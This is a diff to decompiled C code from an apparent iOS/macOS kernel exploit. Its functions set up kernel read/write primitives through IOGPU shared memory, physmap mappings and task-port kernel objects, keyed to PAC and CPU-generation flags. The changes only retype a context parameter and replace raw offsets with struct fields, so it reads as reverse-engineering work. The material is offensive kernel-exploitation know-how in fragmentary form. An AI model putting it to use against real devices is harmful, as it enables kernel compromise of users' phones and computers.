@@ -134,14 +134,14 @@ __int64 __fastcall iogpu_kread(__int64 a1, __int16 a2, char *a3, unsigned int a4
 __int64 __fastcall iogpu_kwrite(__int64 a1, __int16 a2, char *a3, unsigned int a4, int a5);
 __int64 __fastcall iogpu_kread2(__int64 a1, unsigned __int64 a2, void *a3, unsigned int a4, int a5);
 __int64 __fastcall iogpu_kwrite2(__int64 a1, unsigned __int64 a2, const void *a3, unsigned int a4, int a5);
-__int64 __fastcall setup_kernel_region_via_flags(__int64 a1);
+__int64 __fastcall setup_kernel_region_via_flags(struct_krwCtx *a1);
 __int64 __fastcall read_task_kobject_physmap(struct_krwCtx *a1, unsigned __int64 a2);
 __int64 __fastcall get_read_task_port_kobject(struct_krwCtx *a1, mach_port_t a2);
 unsigned __int64 __fastcall check_task_port_type(__int64 krwCtx, unsigned __int64 a2);
 __int64 __fastcall free_iogpu_krw_ctx(__int64 a1);
 __int64 __fastcall iogpu_teardown_ctx(__int64 a1);
 __int64 __fastcall create_iogpu_shmem_entry(__int64 a1, uint32_t *a2, uint32_t *a3, mach_port_t *a4, uint64_t *a5);
-__int64 __fastcall iogpu_physmap_init(__int64 a1);
+__int64 __fastcall iogpu_physmap_init(struct_krwCtx *a1);
 __int64 __fastcall iogpu_init_private_ctx(__int64 a1, uint64_t *a2, mem_entry_name_port_t a3, mem_entry_name_port_t a4, mem_entry_name_port_t a5, uint64_t *a6);
 __int64 __fastcall iogpu_krw_ctx_setup(__int64 a1, uint32_t *a2);
 __int64 __fastcall get_iogpu_physmap_base(__int64);
@@ -848,7 +848,7 @@ static bool krw_finish_selected_setup_path(struct_krwCtx *krwCtx, krw_setup_path
     case KRW_SETUP_PATH_PORTS_VM:
       return krw_setup_physmap((__int64)krwCtx);
     case KRW_SETUP_PATH_IOGPU:
-      return iogpu_physmap_init((__int64)krwCtx) == 0;
+      return iogpu_physmap_init(krwCtx) == 0;
     case KRW_SETUP_PATH_IOSURFACE:
     default:
       return krw_setup_iosurface((__int64)krwCtx);
@@ -4964,7 +4964,7 @@ __int64 __fastcall iogpu_kwrite2(__int64 a1, unsigned __int64 a2, const void *a3
 }
 
 //----- (000000000000A614) ----------------------------------------------------
-__int64 __fastcall setup_kernel_region_via_flags(__int64 a1)
+__int64 __fastcall setup_kernel_region_via_flags(struct_krwCtx *a1)
 {
   __int64 v2; // x21
   int v3; // w8
@@ -4977,9 +4977,9 @@ __int64 __fastcall setup_kernel_region_via_flags(__int64 a1)
   __int128 v11; // [xsp+10h] [xbp-30h]
 
   v2 = 708616;
-  if ( !krw_ctx_has_flag((struct_krwCtx *)a1, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
+  if ( !krw_ctx_has_flag(a1, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
     return v2;
-  v3 = *(uint32_t *)a1 & KRW_CTX_FLAG_CPU_A8_TO_A17_MASK;
+  v3 = a1->flags & KRW_CTX_FLAG_CPU_A8_TO_A17_MASK;
   if ( v3 == 0x100000 )
   {
     v10 = xmmword_42D80;
@@ -5030,20 +5030,20 @@ LABEL_19:
   run_physmap_setup_sequence(v6);
   validate_physmap_range_3(v6);
   setup_physmap_copy_structure(v6);
-  v6[186] = a1;
+  v6[186] = (uint64_t)a1;
   if ( !*v7 )
     *v7 = v6[2];
   v2 = 0;
-  *(uint64_t *)(a1 + 48) = iogpu_kread;
-  *(uint64_t *)(a1 + 64) = iogpu_kwrite;
-  *(uint64_t *)(a1 + 56) = iogpu_kread2;
-  *(uint64_t *)(a1 + 72) = iogpu_kwrite2;
-  *(uint64_t *)(a1 + 80) = v6;
+  *(uint64_t *)&a1->gap4[44] = (uint64_t)iogpu_kread;
+  *(uint64_t *)&a1->gap4[60] = (uint64_t)iogpu_kwrite;
+  *(uint64_t *)&a1->gap4[52] = (uint64_t)iogpu_kread2;
+  *(uint64_t *)&a1->gap4[68] = (uint64_t)iogpu_kwrite2;
+  *(uint64_t *)&a1->gap4[76] = (uint64_t)v6;
   v6[183] = read_task_kobject_physmap;
   v6[184] = get_read_task_port_kobject;
   v6[185] = check_task_port_type;
-  *(uint64_t *)(a1 + 480) = necp_send_msg_1;
-  *(uint64_t *)(a1 + 488) = v6;
+  *(uint64_t *)&a1->gap190[80] = (uint64_t)necp_send_msg_1;
+  *(uint64_t *)&a1->gap190[88] = (uint64_t)v6;
   return v2;
 }
 // 42D40: using guessed type __int128 xmmword_42D40;
@@ -5240,7 +5240,7 @@ __int64 __fastcall create_iogpu_shmem_entry(__int64 a1, uint32_t *a2, uint32_t *
 }
 
 //----- (000000000000AC50) ----------------------------------------------------
-__int64 __fastcall iogpu_physmap_init(__int64 a1)
+__int64 __fastcall iogpu_physmap_init(struct_krwCtx *a1)
 {
   vm_size_t v2; // x20
   kern_return_t memory_entry; // w0
@@ -5272,10 +5272,10 @@ __int64 __fastcall iogpu_physmap_init(__int64 a1)
     return memory_entry | 0x80000000;
   bzero((void *)address, v2);
   v5 = (uint64_t *)address;
-  *(uint64_t *)address = *(uint64_t *)(a1 + 6608);
-  v5[4] = *(uint64_t *)(a1 + 6296);
-  v5[5] = *(unsigned int *)(a1 + 6304);
-  result = create_iogpu_shmem_entry(a1, (uint32_t *)&v16 + 1, &v16, &v15, v5);
+  *(uint64_t *)address = a1->gap19211;
+  v5[4] = a1->gap191[677];
+  v5[5] = LODWORD(a1->gap191[678]);
+  result = create_iogpu_shmem_entry((__int64)a1, (uint32_t *)&v16 + 1, &v16, &v15, v5);
   if ( !(uint32_t)result )
   {
     vm_deallocate(mach_task_self_, address, v2);
@@ -5284,14 +5284,14 @@ __int64 __fastcall iogpu_physmap_init(__int64 a1)
     v17[2] = v16;
     v17[3] = v15;
     v14 = xmmword_43740;
-    v6 = iosurface_enum_mach_port(a1, 0x15u);
+    v6 = iosurface_enum_mach_port((__int64)a1, 0x15u);
     if ( v6 )
     {
       v7 = (uint32_t *)v6;
       for ( i = 0; ; ++i )
       {
         v9 = v17[i];
-        v10 = task_self_get_ipc_port((struct_krwCtx *)a1, v9);
+        v10 = task_self_get_ipc_port(a1, v9);
         if ( !v10 )
           return 163854;
         result = kread_and_vm_attr_double(a1, v10);
@@ -5303,12 +5303,12 @@ __int64 __fastcall iogpu_physmap_init(__int64 a1)
         *v7 = v9;
         if ( i == 3 )
           break;
-        v7 = (uint32_t *)iosurface_enum_mach_port(a1, *(uint32_t *)((char *)&v14 + i * 4 + 4));
+        v7 = (uint32_t *)iosurface_enum_mach_port((__int64)a1, *(uint32_t *)((char *)&v14 + i * 4 + 4));
         result = 4097;
         if ( !v7 )
           return result;
       }
-      return iosurface_check_and_alloc_port((struct_krwCtx *)a1);
+      return iosurface_check_and_alloc_port(a1);
     }
     else
     {
